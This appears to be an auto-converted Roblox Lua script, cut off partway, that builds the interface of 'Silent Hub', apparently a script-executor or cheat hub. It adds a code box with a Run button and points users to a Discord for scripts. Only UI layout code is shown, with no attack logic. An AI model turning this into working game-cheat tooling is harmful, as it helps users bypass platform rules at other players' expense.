--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 223 | Scripts: 3 | Modules: 2 | Tags: 0
local G2L = {};

-- StarterGui.Silent Hub
G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["DisplayOrder"] = 2147483647;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["ClipToDeviceSafeArea"] = false;
G2L["1"]["Name"] = [[Silent Hub]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["SelectionGroup"] = true;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.Silent Hub.UI
G2L["2"] = Instance.new("Folder", G2L["1"]);
G2L["2"]["Name"] = [[UI]];


-- StarterGui.Silent Hub.UI.Interface
G2L["3"] = Instance.new("CanvasGroup", G2L["2"]);
G2L["3"]["Active"] = true;
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(51, 51, 51);
G2L["3"]["Size"] = UDim2.new(0, 620, 0, 320);
G2L["3"]["Position"] = UDim2.new(0.25381, 0, 0.22568, 0);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["Name"] = [[Interface]];
G2L["3"]["BackgroundTransparency"] = 0.0755;


-- StarterGui.Silent Hub.UI.Interface.UIDrag
G2L["4"] = Instance.new("LocalScript", G2L["3"]);
-- [ERROR] cannot convert Capabilities, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4"]["Sandboxed"] = true;
G2L["4"]["Name"] = [[UIDrag]];


-- StarterGui.Silent Hub.UI.Interface.UICorner
G2L["5"] = Instance.new("UICorner", G2L["3"]);
G2L["5"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.UIScale
G2L["6"] = Instance.new("UIScale", G2L["3"]);



-- StarterGui.Silent Hub.UI.Interface.Titlebar
G2L["7"] = Instance.new("Frame", G2L["3"]);
G2L["7"]["ZIndex"] = 3;
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["7"]["Size"] = UDim2.new(0, 620, 0, 25);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Name"] = [[Titlebar]];
G2L["7"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Silent Hub.UI.Interface.Titlebar.TextLabel
G2L["8"] = Instance.new("TextLabel", G2L["7"]);
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["TextSize"] = 18;
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["BackgroundTransparency"] = 1;
G2L["8"]["AnchorPoint"] = Vector2.new(0.5, 0);
G2L["8"]["Size"] = UDim2.new(0, 200, 0, 25);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Text"] = [[Silent Hub]];
G2L["8"]["Position"] = UDim2.new(0.5, 0, 0, 0);


-- StarterGui.Silent Hub.UI.Interface.Titlebar.Close
G2L["9"] = Instance.new("TextButton", G2L["7"]);
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["TextSize"] = 25;
G2L["9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Merriweather.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9"]["BackgroundTransparency"] = 1;
G2L["9"]["Size"] = UDim2.new(0, 25, 0, 25);
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Text"] = [[🗙]];
G2L["9"]["Name"] = [[Close]];
G2L["9"]["Position"] = UDim2.new(0.94355, 0, 0, 0);


-- StarterGui.Silent Hub.UI.Interface.Titlebar.Minimize
G2L["a"] = Instance.new("TextButton", G2L["7"]);
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["TextSize"] = 25;
G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["a"]["BackgroundTransparency"] = 1;
G2L["a"]["Size"] = UDim2.new(0, 25, 0, 25);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Text"] = [[—]];
G2L["a"]["Name"] = [[Minimize]];
G2L["a"]["Position"] = UDim2.new(0.89032, 0, 0, 0);


-- StarterGui.Silent Hub.UI.Interface.Titlebar.Hamburger
G2L["b"] = Instance.new("ImageButton", G2L["7"]);
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["BackgroundTransparency"] = 1;
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["Image"] = [[rbxassetid://708157521]];
G2L["b"]["Size"] = UDim2.new(0, 25, 0, 25);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Name"] = [[Hamburger]];
G2L["b"]["Position"] = UDim2.new(0.02, 0, 0, 0);


-- StarterGui.Silent Hub.UI.Interface.Menu
G2L["c"] = Instance.new("Frame", G2L["3"]);
G2L["c"]["ZIndex"] = 2;
G2L["c"]["BorderSizePixel"] = 0;
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["c"]["ClipsDescendants"] = true;
G2L["c"]["Size"] = UDim2.new(0, 90, 0, 295);
G2L["c"]["Position"] = UDim2.new(0, 0, 0.07813, 0);
G2L["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Name"] = [[Menu]];
G2L["c"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Silent Hub.UI.Interface.Menu.Container
G2L["d"] = Instance.new("Frame", G2L["c"]);
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["Size"] = UDim2.new(0, 90, 0, 284);
G2L["d"]["Position"] = UDim2.new(0, 0, 0.03729, 0);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Name"] = [[Container]];
G2L["d"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.Interface.Menu.Container.UIListLayout
G2L["e"] = Instance.new("UIListLayout", G2L["d"]);
G2L["e"]["Padding"] = UDim.new(0, 2);
G2L["e"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["e"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Silent Hub.UI.Interface.Container
G2L["f"] = Instance.new("Frame", G2L["3"]);
G2L["f"]["BorderSizePixel"] = 0;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["ClipsDescendants"] = true;
G2L["f"]["Size"] = UDim2.new(0, 530, 0, 295);
G2L["f"]["Position"] = UDim2.new(0.14516, 0, 0.07813, 0);
G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["Name"] = [[Container]];
G2L["f"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.Interface.Container.Container1
G2L["10"] = Instance.new("Frame", G2L["f"]);
G2L["10"]["Active"] = true;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["10"]["ClipsDescendants"] = true;
G2L["10"]["Size"] = UDim2.new(0, 515, 0, 282);
G2L["10"]["Position"] = UDim2.new(0.015, 0, 0.02, 0);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Name"] = [[Container1]];
G2L["10"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Silent Hub.UI.Interface.Container.Container1.UICorner
G2L["11"] = Instance.new("UICorner", G2L["10"]);
G2L["11"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container1.ProfilePicture
G2L["12"] = Instance.new("ImageLabel", G2L["10"]);
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
G2L["12"]["Size"] = UDim2.new(0, 75, 0, 75);
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Name"] = [[ProfilePicture]];
G2L["12"]["Position"] = UDim2.new(0.0233, 0, 0.03901, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container1.ProfilePicture.UICorner
G2L["13"] = Instance.new("UICorner", G2L["12"]);
G2L["13"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container1.WelcomeText
G2L["14"] = Instance.new("TextLabel", G2L["10"]);
G2L["14"]["LineHeight"] = 0;
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["TextSize"] = 30;
G2L["14"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["BackgroundTransparency"] = 1;
G2L["14"]["Size"] = UDim2.new(0, 356, 0, 75);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Text"] = [[Hello, OnlyTwentyCharacters!]];
G2L["14"]["Name"] = [[WelcomeText]];
G2L["14"]["Position"] = UDim2.new(0.19029, 0, 0.03901, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container1.Information
G2L["15"] = Instance.new("TextLabel", G2L["10"]);
G2L["15"]["TextWrapped"] = true;
G2L["15"]["BorderSizePixel"] = 0;
G2L["15"]["TextSize"] = 14;
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15"]["BackgroundTransparency"] = 1;
G2L["15"]["RichText"] = true;
G2L["15"]["Size"] = UDim2.new(0, 490, 0, 97);
G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["Text"] = [[To get started click the tabs to find what scripts your looking for.<br/>The scrolling bar is invisible so to scroll use your scroll wheel, however there is an option in settings to change that.<br/><br/>Want scripts or more features added?<br/><br/>Join our Discord for support, donations, and more!]];
G2L["15"]["Name"] = [[Information]];
G2L["15"]["Position"] = UDim2.new(0.0233, 0, 0.33688, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container1.Server
G2L["16"] = Instance.new("TextLabel", G2L["10"]);
G2L["16"]["TextWrapped"] = true;
G2L["16"]["ZIndex"] = 30;
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["TextSize"] = 15;
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["BackgroundTransparency"] = 0.9;
G2L["16"]["Size"] = UDim2.new(0, 491, 0, 29);
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["Text"] = [[Server:]];
G2L["16"]["Name"] = [[Server]];
G2L["16"]["Position"] = UDim2.new(0.02207, 0, 0.73442, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container1.Server.UICorner
G2L["17"] = Instance.new("UICorner", G2L["16"]);
G2L["17"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container1.MOTD
G2L["18"] = Instance.new("TextLabel", G2L["10"]);
G2L["18"]["TextWrapped"] = true;
G2L["18"]["ZIndex"] = 30;
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["TextSize"] = 15;
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["BackgroundTransparency"] = 0.9;
G2L["18"]["Size"] = UDim2.new(0, 491, 0, 29);
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Text"] = [[MOTD:]];
G2L["18"]["Name"] = [[MOTD]];
G2L["18"]["Position"] = UDim2.new(0.02207, 0, 0.86914, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container1.MOTD.UICorner
G2L["19"] = Instance.new("UICorner", G2L["18"]);
G2L["19"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2
G2L["1a"] = Instance.new("Frame", G2L["f"]);
G2L["1a"]["Active"] = true;
G2L["1a"]["BorderSizePixel"] = 0;
G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["1a"]["ClipsDescendants"] = true;
G2L["1a"]["Size"] = UDim2.new(0, 515, 0, 282);
G2L["1a"]["Position"] = UDim2.new(0.015, 0, 0.02, 0);
G2L["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a"]["Name"] = [[Container2]];
G2L["1a"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.UICorner
G2L["1b"] = Instance.new("UICorner", G2L["1a"]);
G2L["1b"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.ScrollingFrame
G2L["1c"] = Instance.new("ScrollingFrame", G2L["1a"]);
G2L["1c"]["Active"] = true;
G2L["1c"]["ZIndex"] = 20;
G2L["1c"]["BorderSizePixel"] = 0;
G2L["1c"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["1c"]["ElasticBehavior"] = Enum.ElasticBehavior.Never;
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY;
G2L["1c"]["Size"] = UDim2.new(0, 500, 0, 214);
G2L["1c"]["Position"] = UDim2.new(0.01447, 0, 0.12081, 0);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["ScrollBarThickness"] = 3;
G2L["1c"]["BackgroundTransparency"] = 0.9;


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.ScrollingFrame.UICorner
G2L["1d"] = Instance.new("UICorner", G2L["1c"]);
G2L["1d"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.ScrollingFrame.Lines
G2L["1e"] = Instance.new("TextLabel", G2L["1c"]);
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["TextSize"] = 14;
G2L["1e"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["BackgroundTransparency"] = 1;
G2L["1e"]["Size"] = UDim2.new(0, 23, 0, 214);
G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["Text"] = [[1]];
G2L["1e"]["AutomaticSize"] = Enum.AutomaticSize.Y;
G2L["1e"]["Name"] = [[Lines]];


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.ScrollingFrame.Separator
G2L["1f"] = Instance.new("Frame", G2L["1c"]);
G2L["1f"]["ZIndex"] = 20;
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["Size"] = UDim2.new(0, 1, 0, 214);
G2L["1f"]["Position"] = UDim2.new(0.045, 0, -0.00232, 0);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["Name"] = [[Separator]];
G2L["1f"]["BackgroundTransparency"] = 0.8;


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.ScrollingFrame.Input
G2L["20"] = Instance.new("TextBox", G2L["1c"]);
G2L["20"]["CursorPosition"] = -1;
G2L["20"]["Name"] = [[Input]];
G2L["20"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["20"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["20"]["BorderSizePixel"] = 0;
G2L["20"]["TextSize"] = 14;
G2L["20"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["20"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["20"]["AutomaticSize"] = Enum.AutomaticSize.XY;
G2L["20"]["MultiLine"] = true;
G2L["20"]["ClearTextOnFocus"] = false;
G2L["20"]["Size"] = UDim2.new(0, 466, 0, 212);
G2L["20"]["Position"] = UDim2.new(0.05971, 0, 0, 0);
G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20"]["Text"] = [[]];
G2L["20"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.ButtonContainer
G2L["21"] = Instance.new("Frame", G2L["1a"]);
G2L["21"]["BorderSizePixel"] = 0;
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21"]["Size"] = UDim2.new(0, 500, 0, 25);
G2L["21"]["Position"] = UDim2.new(0.014, 0, 0.895, 0);
G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Name"] = [[ButtonContainer]];
G2L["21"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.ButtonContainer.Run
G2L["22"] = Instance.new("TextButton", G2L["21"]);
G2L["22"]["BorderSizePixel"] = 0;
G2L["22"]["TextSize"] = 14;
G2L["22"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["22"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["22"]["BackgroundTransparency"] = 0.9;
G2L["22"]["Size"] = UDim2.new(0, 450, 0, 25);
G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22"]["Text"] = [[Run]];
G2L["22"]["Name"] = [[Run]];
G2L["22"]["Position"] = UDim2.new(0, 0, 0, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.ButtonContainer.Run.UICorner
G2L["23"] = Instance.new("UICorner", G2L["22"]);
G2L["23"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.ButtonContainer.UIListLayout
G2L["24"] = Instance.new("UIListLayout", G2L["21"]);
G2L["24"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["24"]["VerticalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["24"]["Padding"] = UDim.new(0.02, 0);
G2L["24"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["24"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.ButtonContainer.Clear
G2L["25"] = Instance.new("TextButton", G2L["21"]);
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["TextSize"] = 14;
G2L["25"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["25"]["BackgroundTransparency"] = 0.9;
G2L["25"]["Size"] = UDim2.new(0, 450, 0, 25);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["Text"] = [[Clear]];
G2L["25"]["Name"] = [[Clear]];
G2L["25"]["Position"] = UDim2.new(0.86645, 0, 0, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.ButtonContainer.Clear.UICorner
G2L["26"] = Instance.new("UICorner", G2L["25"]);
G2L["26"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.ButtonContainer.R6
G2L["27"] = Instance.new("TextButton", G2L["21"]);
G2L["27"]["BorderSizePixel"] = 0;
G2L["27"]["TextSize"] = 14;
G2L["27"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["27"]["BackgroundTransparency"] = 0.9;
G2L["27"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["27"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["Text"] = [[R6]];
G2L["27"]["Name"] = [[R6]];


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.ButtonContainer.R6.UICorner
G2L["28"] = Instance.new("UICorner", G2L["27"]);
G2L["28"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.ButtonContainer.R15
G2L["29"] = Instance.new("TextButton", G2L["21"]);
G2L["29"]["BorderSizePixel"] = 0;
G2L["29"]["TextSize"] = 14;
G2L["29"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["29"]["BackgroundTransparency"] = 0.9;
G2L["29"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["Text"] = [[R15]];
G2L["29"]["Name"] = [[R15]];


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.ButtonContainer.R15.UICorner
G2L["2a"] = Instance.new("UICorner", G2L["29"]);
G2L["2a"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.ButtonContainer.Respawn
G2L["2b"] = Instance.new("TextButton", G2L["21"]);
G2L["2b"]["BorderSizePixel"] = 0;
G2L["2b"]["TextSize"] = 14;
G2L["2b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2b"]["BackgroundTransparency"] = 0.9;
G2L["2b"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["Text"] = [[Respawn]];
G2L["2b"]["Name"] = [[Respawn]];


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.ButtonContainer.Respawn.UICorner
G2L["2c"] = Instance.new("UICorner", G2L["2b"]);
G2L["2c"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.Container
G2L["2d"] = Instance.new("Frame", G2L["1a"]);
G2L["2d"]["BorderSizePixel"] = 0;
G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d"]["ClipsDescendants"] = true;
G2L["2d"]["Size"] = UDim2.new(0, 499, 0, 15);
G2L["2d"]["Position"] = UDim2.new(0.01641, 0, 0.04128, 0);
G2L["2d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d"]["Name"] = [[Container]];
G2L["2d"]["BackgroundTransparency"] = 0.9;


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.Container.UIListLayout
G2L["2e"] = Instance.new("UIListLayout", G2L["2d"]);
G2L["2e"]["Padding"] = UDim.new(0.01, 0);
G2L["2e"]["VerticalAlignment"] = Enum.VerticalAlignment.Bottom;
G2L["2e"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["2e"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.Container.Add
G2L["2f"] = Instance.new("TextButton", G2L["2d"]);
G2L["2f"]["BorderSizePixel"] = 0;
G2L["2f"]["TextSize"] = 15;
G2L["2f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["2f"]["ZIndex"] = 20;
G2L["2f"]["BackgroundTransparency"] = 1;
G2L["2f"]["Size"] = UDim2.new(0, 16, 0, 15);
G2L["2f"]["LayoutOrder"] = 10;
G2L["2f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["Text"] = [[+]];
G2L["2f"]["Name"] = [[Add]];
G2L["2f"]["Position"] = UDim2.new(0.155, 0, 0.018, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.Container.UICorner
G2L["30"] = Instance.new("UICorner", G2L["2d"]);
G2L["30"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.OptContainer
G2L["31"] = Instance.new("Frame", G2L["1a"]);
G2L["31"]["Visible"] = false;
G2L["31"]["Active"] = true;
G2L["31"]["ZIndex"] = 25;
G2L["31"]["BorderSizePixel"] = 0;
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Size"] = UDim2.new(0, 561, 0, 293);
G2L["31"]["Position"] = UDim2.new(-0.03169, 0, -0.05472, 0);
G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Name"] = [[OptContainer]];
G2L["31"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.OptContainer.Options
G2L["32"] = Instance.new("CanvasGroup", G2L["31"]);
G2L["32"]["GroupTransparency"] = 0.1;
G2L["32"]["Active"] = true;
G2L["32"]["ZIndex"] = 25;
G2L["32"]["BorderSizePixel"] = 0;
G2L["32"]["BackgroundColor3"] = Color3.fromRGB(57, 57, 57);
G2L["32"]["Size"] = UDim2.new(0, 155, 0, 137);
G2L["32"]["Position"] = UDim2.new(0.36116, 0, 0.2519, 0);
G2L["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["Name"] = [[Options]];


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.OptContainer.Options.UICorner
G2L["33"] = Instance.new("UICorner", G2L["32"]);
G2L["33"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.OptContainer.Options.Save
G2L["34"] = Instance.new("TextButton", G2L["32"]);
G2L["34"]["BorderSizePixel"] = 0;
G2L["34"]["TextSize"] = 18;
G2L["34"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["34"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["34"]["ZIndex"] = 26;
G2L["34"]["BackgroundTransparency"] = 0.85;
G2L["34"]["Size"] = UDim2.new(0, 62, 0, 24);
G2L["34"]["LayoutOrder"] = 2;
G2L["34"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["Text"] = [[Save]];
G2L["34"]["Name"] = [[Save]];
G2L["34"]["Position"] = UDim2.new(0.03871, 0, 0.78102, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.OptContainer.Options.Save.UICorner
G2L["35"] = Instance.new("UICorner", G2L["34"]);
G2L["35"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.OptContainer.Options.Close
G2L["36"] = Instance.new("TextButton", G2L["32"]);
G2L["36"]["BorderSizePixel"] = 0;
G2L["36"]["TextSize"] = 18;
G2L["36"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["36"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["36"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["36"]["ZIndex"] = 26;
